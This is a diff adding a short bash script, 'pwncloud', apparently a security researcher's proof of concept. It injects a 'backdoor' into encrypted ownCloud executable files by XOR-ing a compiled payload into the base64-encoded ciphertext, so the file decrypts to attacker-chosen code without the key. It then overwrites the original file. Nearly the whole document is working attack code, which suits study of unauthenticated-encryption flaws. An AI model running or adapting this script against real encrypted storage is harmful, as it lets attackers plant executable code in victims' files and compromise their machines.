@@ -1,0 +1,47 @@
+#!/bin/bash
+#
+# pwncloud
+# place "backdoor" in encrypted owncloud exe files
+#
+# author: Hanno Böck, https://hboeck.de
+# license: CC0 / public domain
+
+DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
+
+if ! [[ -e $DIR/pwn.com ]] || ! [[ -e $DIR/xor ]]; then
+	echo compiled code not found, please run make
+	exit 1
+fi
+
+if ! [[ -e $1 ]]; then
+	echo Usage:
+	echo $0 [encrypted_exe]
+	exit 2
+fi
+
+tmpd=$(mktemp -d)
+
+eop=$(grep -o --byte-offset 00iv00 $1 | head -n 1 | sed -e 's/:.*//g')
+psize=$(echo $eop-8192|bc)
+
+dd if=$1 of=$tmpd/pwncloud.header bs=1k count=8 status=none
+dd if=$1 of=$tmpd/pwncloud.part bs=1 skip=8192 count=$psize status=none
+dd if=$1 of=$tmpd/pwncloud.footer bs=1 skip=$eop status=none
+
+base64 -d $tmpd/pwncloud.part > $tmpd/pwncloud.part.decoded
+
+dd if=/dev/zero of=$tmpd/bitmask bs=32 count=1 status=none
+echo -ne '\01' >> $tmpd/bitmask
+dd if=/dev/zero of=$tmpd/bitmask bs=31 count=1 oflag=append conv=notrunc status=none
+
+$DIR/xor $DIR/pwn.com $DIR/exepart.bin $tmpd/xorpwn
+cat $tmpd/xorpwn >> $tmpd/bitmask
+
+$DIR/xor $tmpd/bitmask $tmpd/pwncloud.part.decoded $tmpd/pwncloud.part.pwn
+base64 -w 0 $tmpd/pwncloud.part.pwn > $tmpd/pwncloud.part.pwn.b64
+cp $1 $1~
+cat $tmpd/pwncloud.header $tmpd/pwncloud.part.pwn.b64 $tmpd/pwncloud.footer > $1
+
+echo "pwncloud'ed $1, backup saved as $1~"
+
+rm -rf $tmpd
